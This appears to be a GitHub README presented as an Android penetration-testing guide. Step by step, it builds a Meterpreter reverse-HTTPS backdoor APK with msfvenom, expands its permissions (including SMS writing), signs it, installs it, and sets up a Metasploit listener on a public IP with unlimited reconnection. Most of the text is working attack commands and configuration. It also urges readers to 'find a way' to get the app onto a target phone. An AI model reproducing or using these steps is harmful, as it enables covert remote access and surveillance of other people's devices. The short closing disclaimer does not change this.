# Stageless Meterpreter Sessions on Android 16 - Samsung Z Flip 5 Rootless (2026):
[![github-banner.jpg](https://i.postimg.cc/sxhdzJLF/github-banner.jpg)](https://postimg.cc/n9pwYqZT)
# Android Penetration Testing Workflow: APK Modification & Local Deployment Guide:

## About
This repository **documents** the **technical process** of **injecting a Metasploit payload** into an **Android application package (APK)**, engineering the manifest to allow **explicit execution**, **cryptographically signing the binary**, and **deploying** it locally via ADB for **security testing**.

---

## Prerequisites

**Ensure** you have the **following tools installed** and **available** in your **system path** and **port forwarding** set up on your **wifi router**:
* **Wifi Router Port Forwarding Active** (`to your Computers Local IP [192.168...]`)
* **Metasploit Framework** (`msfvenom`, `msfconsole`)
* **Apktool**
* **Zipalign**
* **Java Development Kit** (`keytool`, `apksigner`)
* **Android Debug Bridge** (`adb`)

---

## Step 1: Payload Generation

**Generate the payload** by **targeting** a **local machine interface**. This **bypasses** network domain resolution **entirely** during **local debugging**. `Be sure to use / for stageless ( meterpreter/reverse_https ) for msfvenom and your msfconsole payload setup.`

```bash
msfvenom -p android/meterpreter/reverse_https LHOST=[YOUR PUBLIC IP] LPORT=443 -o payload_example.apk
```
---

## Step 2: Manifest Engineering

**Decompile** the binary package to **modify its configuration**, then **recompile** it to enforce **structural integrity**.

### 1. Decompile the APK
```bash
apktool d payload_example.apk -o example_folder
```

### 2. Modify the Manifest
```
 cd example_folder
```
```  
 nano AndroidManifest.xml
```
```bash
# Add ALL of this to beginning of the AndroidManifest.xml
<?xml version="1.0" encoding="utf-8" standalone="no"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.metasploit.stage">

    <uses-sdk
        android:minSdkVersion="19"
        android:targetSdkVersion="31"/>

    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
```
```bash
# Replace <service near the bottom to this:
 <service android:exported="false" android:name=".MainService" android:enabled="true" android:foregroundServiceType="specialUse"/>
```
```bash
# And make sure this is present inside the <activity section:
 android:exported="true"
```
**Press** `ctrl + o` then `ENTER` to **save**, and `ctrl + x` to **exit**.

```bash
# Inside the same example_folder 
nano apktool.yml 
```
```bash
# Replace entire text with this:(change name at top to your .apk app name)
version: 2.9.3
apkFileName:[YOUR_APP_NAME].apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
  tag: null
sdkInfo:
  minSdkVersion: 21
  targetSdkVersion: 31
packageInfo:
  forcedPackageId: 127
  renameManifestPackage: null
versionInfo:
  versionCode: 1
  versionName: 1.0
resourcesAreCompressed: false
sharedLibrary: false
sparseResources: false
doNotCompress:
- resources.arsc
- assets
- png
 ```
**Press** `ctrl + o` then `ENTER` to **save**, and `ctrl + x` to **exit**.

### 3. Recompile the APK
```bash
# Go back one directory
cd ..
```
```bash
# Recompile the .apk
apktool b example_folder -o payload_example.apk
```
---

## Step 3: Cryptographic Signing

**Android environments** sometimes **reject unsigned applications**. Create a **development keystore** and apply it using standard **cryptographic schemas**.

```bash
# Align the APK
zipalign -v -p 4 payload_example.apk aligned_example.apk
```
```bash
# Generate a development keystore
keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias
```
```bash
# Sign the recompiled APK
apksigner sign --ks my-release-key.jks --out signed_example.apk aligned_example.apk
```
---

## Step 4: Installing

**Install** onto phone using **ADB** or **find a way** to get it onto **target phone/tablet. Be creative**.

For **ADB** plug phone into **computer** and enter:
```
adb install --bypass-low-target-sdk-block signed_example.apk
```
---

## Step 5: Session Handling & Execution

In a **seperate terminal**, start the **Metasploit framework** locally to **listen** for the **incoming reverse connection**.

```bash
msfconsole
```
**Inside** the **Metasploit console**, execute the **following handler configuration**:
```
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST [YOUR PUBLIC IP]
set LPORT 443
set ExitOnSession false
set SessionRetryTotal (0 for infinite reconnection attempts & 3600 for 1 hour)
run

```
### Expected Output *(App on phone MUST grant permissions and be CLICKED at least once)*
```text
[*] Meterpreter session 1 opened successfully established.

meterpreter >
```

### Once session starts
```
meterpreter > help (to see available commands)
meterpreter > wakelock 
background (to go back to msfconsole without killing session)
msf exploit(multi/handler) > sessions -l (to list sessions)
msf exploit(multi/handler) > sessions -i 1 (or other #) to open session
```

### BOOOOOOM!!!
You got **stageless meterpreter** sessions open! 

---

### ⭐ Support the Project

If you find this guide **useful**, please consider giving the project a **Star** ⭐ — it **helps** a lot!

**Contributions** are **always welcome**!

---

**Disclaimer:** This guide is for **educational** and **authorized** security testing purposes **only. Enjoy**!
